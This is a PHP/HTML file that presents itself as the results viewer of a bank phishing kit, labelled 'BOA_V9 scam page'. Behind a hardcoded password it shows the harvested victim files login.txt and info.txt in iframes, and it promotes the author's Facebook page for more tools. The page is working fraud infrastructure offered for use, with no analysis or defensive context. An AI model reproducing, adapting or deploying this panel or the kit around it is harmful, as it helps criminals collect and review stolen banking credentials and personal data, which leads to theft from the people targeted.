<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<style type="text/css">.button {
  background-color: black;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
	</style>
	<title>Resulta By Iyed</title>
	<link href="https://i.imgur.com/DqEzL74.png" rel="icon" />
</head>
<body style="background-color:powderblue;">
<table border="1" cellpadding="1" cellspacing="1" style="width:100px;">
	<tbody>
		<tr>
			<td><img alt="" src="https://i.imgur.com/DqEzL74.png" style="width: 120px; height: 120px;" /></td>
		</tr>
	</tbody>
</table>

<p style="text-align: center;"><span style="font-size:28px;"><strong><span style="font-family:fantasy;">Now you can enjoy your Resulta</span></strong></span></p>
    <?php
$password = "boav9"; // Change Password here

session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);


$leaf['version']="2.7";
$leaf['website']="leafmailer.pw";


$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    # _REQUEST mean _POST or _GET 
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}
?>
<p style="text-align: center;">&nbsp; &nbsp;&nbsp;</p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;<span style="font-family:trebuchet ms,helvetica,sans-serif;"><a class="button" href="../send/login.txt" target="_blank">Login</a></span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="font-family:trebuchet ms,helvetica,sans-serif;"><a class="button" href="../send/info.txt" target="_blank">Info</a></span></p>

<p>&nbsp;&nbsp;<iframe height="500" src="../send/login.txt" width="400"></iframe>&nbsp;&nbsp;<iframe height="500" src="../send/info.txt" width="400"></iframe></p>
<p style="text-align: center;"><span style="font-size:28px;"><strong><span style="font-family:fantasy;">BOA_V9 scam page | <a href="https://www.facebook.com/oussa.zidi.7">Visit my Facebook for other tools</a></span></strong></span></p>
</body>
</html>
